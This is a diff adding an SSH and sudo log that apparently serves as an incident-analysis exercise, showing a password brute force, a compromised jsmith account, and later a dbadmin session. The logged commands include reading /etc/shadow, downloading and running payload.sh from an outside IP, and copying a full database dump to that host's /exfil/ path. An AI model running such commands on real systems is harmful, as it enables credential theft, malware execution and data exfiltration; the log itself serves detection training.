@@ -1,0 +1,72 @@
+2024-11-22 02:44:01 sshd[1100]: Received disconnect from 203.0.113.9 port 41932
+2024-11-22 02:58:11 sshd[1101]: Failed password for admin from 192.168.1.45 port 22
+2024-11-22 02:58:13 sshd[1101]: Failed password for admin from 192.168.1.45 port 22
+2024-11-22 02:58:15 sshd[1101]: Failed password for admin from 192.168.1.45 port 22
+2024-11-22 02:58:17 sshd[1101]: Failed password for admin from 192.168.1.45 port 22
+2024-11-22 02:58:19 sshd[1101]: Failed password for admin from 192.168.1.45 port 22
+2024-11-22 02:58:21 sshd[1101]: Failed password for admin from 192.168.1.45 port 22
+2024-11-22 02:58:23 sshd[1101]: Failed password for admin from 192.168.1.45 port 22
+2024-11-22 02:58:25 sshd[1101]: Failed password for admin from 192.168.1.45 port 22
+2024-11-22 02:58:27 sshd[1101]: Failed password for root from 192.168.1.45 port 22
+2024-11-22 02:58:29 sshd[1101]: Failed password for root from 192.168.1.45 port 22
+2024-11-22 02:58:31 sshd[1101]: Failed password for root from 192.168.1.45 port 22
+2024-11-22 02:58:33 sshd[1101]: Failed password for root from 192.168.1.45 port 22
+2024-11-22 02:58:35 sshd[1101]: Failed password for root from 192.168.1.45 port 22
+2024-11-22 02:58:37 sshd[1102]: Failed password for ubuntu from 192.168.1.45 port 22
+2024-11-22 02:58:39 sshd[1102]: Failed password for ubuntu from 192.168.1.45 port 22
+2024-11-22 02:58:41 sshd[1102]: Failed password for ubuntu from 192.168.1.45 port 22
+2024-11-22 02:58:43 sshd[1102]: Failed password for deploy from 192.168.1.45 port 22
+2024-11-22 02:58:45 sshd[1102]: Failed password for deploy from 192.168.1.45 port 22
+2024-11-22 02:58:47 sshd[1102]: Failed password for deploy from 192.168.1.45 port 22
+2024-11-22 02:59:01 sshd[1103]: Failed password for jenkins from 192.168.1.45 port 22
+2024-11-22 02:59:03 sshd[1103]: Failed password for jenkins from 192.168.1.45 port 22
+2024-11-22 02:59:05 sshd[1103]: Failed password for git from 192.168.1.45 port 22
+2024-11-22 02:59:07 sshd[1103]: Failed password for git from 192.168.1.45 port 22
+2024-11-22 02:59:09 sshd[1103]: Failed password for git from 192.168.1.45 port 22
+2024-11-22 02:59:11 sshd[1103]: Failed password for postgres from 192.168.1.45 port 22
+2024-11-22 02:59:13 sshd[1103]: Failed password for postgres from 192.168.1.45 port 22
+2024-11-22 02:59:15 sshd[1103]: Failed password for mysql from 192.168.1.45 port 22
+2024-11-22 02:59:17 sshd[1103]: Failed password for mysql from 192.168.1.45 port 22
+2024-11-22 02:59:19 sshd[1103]: Failed password for oracle from 192.168.1.45 port 22
+2024-11-22 02:59:21 sshd[1104]: Failed password for jsmith from 192.168.1.45 port 22
+2024-11-22 02:59:23 sshd[1104]: Failed password for jsmith from 192.168.1.45 port 22
+2024-11-22 02:59:25 sshd[1104]: Failed password for jsmith from 192.168.1.45 port 22
+2024-11-22 02:59:27 sshd[1104]: Failed password for jsmith from 192.168.1.45 port 22
+2024-11-22 02:59:29 sshd[1104]: Accepted password for jsmith from 192.168.1.45 port 22
+2024-11-22 02:59:31 sshd[1104]: pam_unix(sshd:session): session opened for user jsmith
+2024-11-22 03:00:14 sudo[1105]: jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/bin/bash
+2024-11-22 03:00:22 sudo[1106]: jsmith : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+2024-11-22 03:00:45 sudo[1107]: jsmith : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://185.220.101.47/payload.sh
+2024-11-22 03:01:02 sudo[1108]: jsmith : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod +x payload.sh
+2024-11-22 03:01:05 sudo[1109]: jsmith : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash payload.sh
+2024-11-22 03:14:22 sshd[1200]: Accepted password for dbadmin from 203.0.113.9 port 22
+2024-11-22 03:14:30 sshd[1200]: pam_unix(sshd:session): session opened for user dbadmin
+2024-11-22 03:15:01 sudo[1201]: dbadmin : TTY=pts/1 ; PWD=/home/dbadmin ; USER=root ; COMMAND=/usr/bin/mysqldump --all-databases
+2024-11-22 03:16:44 sudo[1202]: dbadmin : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/scp dump.sql 185.220.101.47:/exfil/
+2024-11-22 03:31:07 sshd[1300]: Failed password for invalid user guest from 45.33.32.156 port 22
+2024-11-22 03:31:09 sshd[1300]: Failed password for invalid user test from 45.33.32.156 port 22
+2024-11-22 03:31:11 sshd[1300]: Failed password for invalid user admin from 45.33.32.156 port 22
+2024-11-22 03:31:13 sshd[1300]: Failed password for invalid user oracle from 45.33.32.156 port 22
+2024-11-22 03:31:15 sshd[1300]: Failed password for invalid user postgres from 45.33.32.156 port 22
+2024-11-22 03:31:17 sshd[1300]: Failed password for invalid user ftp from 45.33.32.156 port 22
+2024-11-22 03:31:19 sshd[1300]: Failed password for invalid user www-data from 45.33.32.156 port 22
+2024-11-22 03:31:21 sshd[1300]: Failed password for invalid user pi from 45.33.32.156 port 22
+2024-11-22 03:31:23 sshd[1300]: Failed password for invalid user ubuntu from 45.33.32.156 port 22
+2024-11-22 03:31:25 sshd[1300]: Failed password for invalid user deploy from 45.33.32.156 port 22
+2024-11-22 03:45:00 sshd[1400]: Connection closed by 192.168.1.45 port 22
+2024-11-22 04:02:11 sshd[1500]: Failed password for invalid user guest from 45.33.32.156 port 4444
+2024-11-22 04:02:13 sshd[1500]: Failed password for invalid user test from 45.33.32.156 port 4433
+2024-11-22 04:02:15 sshd[1500]: Failed password for invalid user nobody from 45.33.32.156 port 4422
+2024-11-22 04:02:17 sshd[1500]: Failed password for invalid user daemon from 45.33.32.156 port 4411
+2024-11-22 04:02:19 sshd[1500]: Failed password for invalid user bin from 45.33.32.156 port 4400
+2024-11-22 04:15:33 sshd[1600]: Accepted password for mrodriguez from 10.0.1.15 port 22
+2024-11-22 04:15:40 sshd[1600]: pam_unix(sshd:session): session opened for user mrodriguez
+2024-11-22 04:16:02 sshd[1601]: Received disconnect from 10.0.1.15 port 22
+2024-11-22 08:00:01 sshd[2000]: Accepted password for jdoe from 10.0.0.12 port 22
+2024-11-22 08:00:05 sshd[2001]: pam_unix(sshd:session): session opened for user jdoe
+2024-11-22 08:30:22 sshd[2002]: Accepted password for mrodriguez from 10.0.0.14 port 22
+2024-11-22 08:30:25 sshd[2003]: pam_unix(sshd:session): session opened for user mrodriguez
+2024-11-22 09:15:44 sshd[2004]: Accepted password for jsmith from 10.0.0.11 port 22
+2024-11-22 17:45:01 sshd[2100]: Received disconnect from 10.0.0.12 port 22
+2024-11-22 17:52:33 sshd[2101]: Received disconnect from 10.0.0.14 port 22
+2024-11-22 18:01:12 sshd[2102]: Received disconnect from 10.0.0.11 port 22
